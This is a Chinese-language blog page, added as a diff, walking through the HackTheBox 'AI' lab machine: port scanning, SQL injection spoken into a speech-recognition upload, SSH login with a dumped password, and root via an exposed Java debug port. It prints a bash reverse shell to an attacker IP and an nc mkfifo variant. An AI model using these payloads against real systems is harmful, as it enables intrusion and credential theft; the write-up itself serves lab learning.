@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="reconnmap 1nmap -sV -sT -sC -o nmapinitial ai.htb  masscan 1masscan -p1-65535 10.10.10.163 --rate=1000 -e eth0  nmap实在太慢了，使用masscan发现开放了22，80端口 gobuster 扫描网站路径 1gobuster dir -u http://ai.htb/ -w /usr/">
+<meta name="keywords" content="Web安全，移动安全，windows安全，漏洞挖掘，代码审计，智能合约">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hackthebox AI">
+<meta property="og:url" content="https://wh0ale.github.io/2020/02/01/hackthebox-AI/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="reconnmap 1nmap -sV -sT -sC -o nmapinitial ai.htb  masscan 1masscan -p1-65535 10.10.10.163 --rate=1000 -e eth0  nmap实在太慢了，使用masscan发现开放了22，80端口 gobuster 扫描网站路径 1gobuster dir -u http://ai.htb/ -w /usr/">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_11-13-09.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-13-35.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-07-56.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-09-55.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-30-33.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_16-47-30.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_18-02-59.png">
+<meta property="og:updated_time" content="2020-02-03T14:01:13.330Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hackthebox AI">
+<meta name="twitter:description" content="reconnmap 1nmap -sV -sT -sC -o nmapinitial ai.htb  masscan 1masscan -p1-65535 10.10.10.163 --rate=1000 -e eth0  nmap实在太慢了，使用masscan发现开放了22，80端口 gobuster 扫描网站路径 1gobuster dir -u http://ai.htb/ -w /usr/">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_11-13-09.png">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2020/02/01/hackthebox-AI/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>hackthebox AI | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2020/02/01/hackthebox-AI/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">hackthebox AI
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2020-02-01 22:50:20" itemprop="dateCreated datePublished" datetime="2020-02-01T22:50:20+08:00">2020-02-01</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2020-02-03 22:01:13" itemprop="dateModified" datetime="2020-02-03T22:01:13+08:00">2020-02-03</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">5.7k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">5 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="recon"><a href="#recon" class="headerlink" title="recon"></a>recon</h1><p>nmap</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -sC -o nmapinitial ai.htb</span><br></pre></td></tr></table></figure>
+
+<p>masscan</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p1-65535 10.10.10.163 --rate=1000 -e eth0</span><br></pre></td></tr></table></figure>
+
+<p>nmap实在太慢了，使用masscan发现开放了<code>22</code>，<code>80</code>端口</p>
+<p>gobuster 扫描网站路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://ai.htb/ -w /usr/share/wordlists/dirb/common.txt -x php</span><br></pre></td></tr></table></figure>
+
+<p>发现存在<code>http://ai.htb/intelligence.php</code></p>
+<p>从下图可以发现<code>ai.pgp</code>存在上传的页面</p>
+<p><code>intelligence.php</code>有一些使用其语音识别的说明</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_11-13-09.png" alt></p>
+<h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><h2 id="ffmpeg"><a href="#ffmpeg" class="headerlink" title="ffmpeg"></a>ffmpeg</h2><p>使用<a href="https://ttsmp3.com/" target="_blank" rel="noopener">ttsmp3.com</a>生成音频文件，并创建了一个测试文件：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-13-35.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i ttsMP3.com_VoiceText_2020-2-3_11_23_15.mp3 ttsMP3.com_VoiceText_2020-2-3_11_23_15.wav</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-07-56.png" alt></p>
+<p>上传显示创建的测试文件内容</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-09-55.png" alt></p>
+<p>这种方法有点麻烦，我们可以采用另一种方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt install apt-file</span><br><span class="line">apt-file update</span><br><span class="line">apt-file search text2wave</span><br><span class="line">apt-get install festival //一步到位</span><br></pre></td></tr></table></figure>
+
+<p>然后生成wav文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;test&quot; | text2wave -o test.wav</span><br></pre></td></tr></table></figure>
+
+<h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>尝试单引号注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i ttsMP3.com_VoiceText_2020-2-3_12_25_27.mp3 ttsMP3.com_VoiceText_2020-2-3_12_25_27.wav</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_12-30-33.png" alt></p>
+<p>返回信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Our understanding of your input is : it&apos;s a test</span><br><span class="line">Query result : You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;s a test&apos;&apos; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>题目考察的是通过AI的解析出来的语句构造sql注入</p>
+<p>这里实在想不懂，就直接从writeup摘抄下来了</p>
+<p>payload:注入数据库</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select database open parenthesis close parenthesis comment database</span><br><span class="line">echo &quot;one open single quote union select database open parenthesis close parenthesis comment database&quot; | text2wave -o test.wav</span><br></pre></td></tr></table></figure>
+
+<p>得到响应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Our understanding of your input is : 1&apos;union select database()-- -</span><br><span class="line">Query result : alexa</span><br></pre></td></tr></table></figure>
+
+<p>数据库名称是<code>alexa</code>，接下来我要做的是枚举表名，</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select test from test comment database</span><br><span class="line">echo &quot;one open single quote union select test from test comment database&quot; | text2wave -o test.wav</span><br></pre></td></tr></table></figure>
+
+<p>得到响应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Our understanding of your input is : 1&apos;union select test from test -- -</span><br><span class="line">Query result : Table &apos;alexa.test&apos; doesn&apos;t exist</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select test from users comment database</span><br></pre></td></tr></table></figure>
+
+<p>得到响应</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Our understanding of your input is : 1&apos;union select test from users -- -</span><br><span class="line">Query result : Unknown column &apos;test&apos; in &apos;field list&apos;</span><br></pre></td></tr></table></figure>
+
+<p><strong>存在user表</strong></p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select username from users comment database</span><br></pre></td></tr></table></figure>
+
+<p>得到响应，没有</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Our understanding of your input is : 1&apos;union select user name from users -- -</span><br><span class="line">Query result : Unknown column &apos;user&apos; in &apos;field list&apos;</span><br></pre></td></tr></table></figure>
+
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one open single quote union select password from users comment database</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆出<code>password</code>列的数据</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Our understanding of your input is : 1&apos;union select password from users -- -</span><br><span class="line">Query result : H,Sq9t6&#125;a&lt;)?q93_</span><br></pre></td></tr></table></figure>
+
+<h2 id="SSH-as-alexa"><a href="#SSH-as-alexa" class="headerlink" title="SSH as alexa"></a>SSH as alexa</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh alexa@ai.htb</span><br><span class="line">password:H,Sq9t6&#125;a&lt;)?q93_</span><br></pre></td></tr></table></figure>
+
+<p>登陆成功</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_16-47-30.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">alexa@AI:~$ cat user.txt</span><br><span class="line">c43b62c682a8c*******d4a2cda55e4b</span><br></pre></td></tr></table></figure>
+
+<h1 id="Elevation"><a href="#Elevation" class="headerlink" title="Elevation"></a>Elevation</h1><p>查看进程</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:~$ ps aux | grep java</span><br><span class="line">root      38409 17.6  5.6 3137572 113460 ?      Sl   08:56   0:03 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start</span><br></pre></td></tr></table></figure>
+
+<p>查看开放端口<code>8000</code>,<code>8080</code>,<code>8005</code>,<code>8009</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">alexa@AI:~$ netstat -ntlp</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      -</span><br><span class="line">tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN      -</span><br></pre></td></tr></table></figure>
+
+<p>通过再次查看该过程，我们还可以看到为<code>java</code>二进制文件提供了以下参数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-agentlib:jdwp=transport=dt_socket,address=localhost:8000</span><br></pre></td></tr></table></figure>
+
+<p>我搜索了该<code>jdwp</code>服务的漏洞利用程序，然后发现了<a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">这个漏洞利用程序</a>。我在alexa上传了python脚本，然后将反向shell有效负载添加到文件中，<code>pwned.sh</code>然后调用它，然后运行漏洞利用程序：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~/Desktop/Hackthebox/AI/pwn/jdwp-shellifier(master) # searchsploit jdwp         </span><br><span class="line">------------------------------------------------- ------------------------------------</span><br><span class="line"> Exploit Title                                   |  Path</span><br><span class="line">                                                 | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------- ------------------------------------</span><br><span class="line">Java Debug Wire Protocol (JDWP) - Remote Code Ex | exploits/java/remote/46501.py</span><br></pre></td></tr></table></figure>
+
+<p>上传脚本<code>pwned.sh</code>还有<code>jdwp-shellifier</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">scp -r pwned.sh alexa@ai.htb:/home/alexa //输入密码即可上传道指定的目录</span><br><span class="line">alexa@AI:~/pwn/jdwp-shellifier$ cat /home/alexa/pwned.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.14.23/1337 0&gt;&amp;1</span><br><span class="line">//本来使用rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 1337 &gt;/tmp/f这条命令的一直无法反弹shell</span><br></pre></td></tr></table></figure>
+
+<p>执行命令</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> --cmd /home/alexa/pwned.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后kali重新连接一个ssh</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc localhost 8005</span><br></pre></td></tr></table></figure>
+
+<p>成功 拿到root权限</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Hexo-Picture/master/blog/Snipaste_2020-02-03_18-02-59.png" alt></p>
+<blockquote>
+<p>在家的宽带非常垃圾，做一些扫描测试的时候经常<code>Timeoout</code></p>
+</blockquote>
+<p>Reference:</p>
+<p><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" target="_blank" rel="noopener">Hacking the Java Debug Wire Protocol – or – “How I met your Java debugger”</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2020/02/01/hackthebox-AI/" title="hackthebox AI">https://wh0ale.github.io/2020/02/01/hackthebox-AI/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2020/01/28/hackthebox-Player/" rel="next" title="hackthebox Player">
+                <i class="fa fa-chevron-left"></i> hackthebox Player
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">132</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">61</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
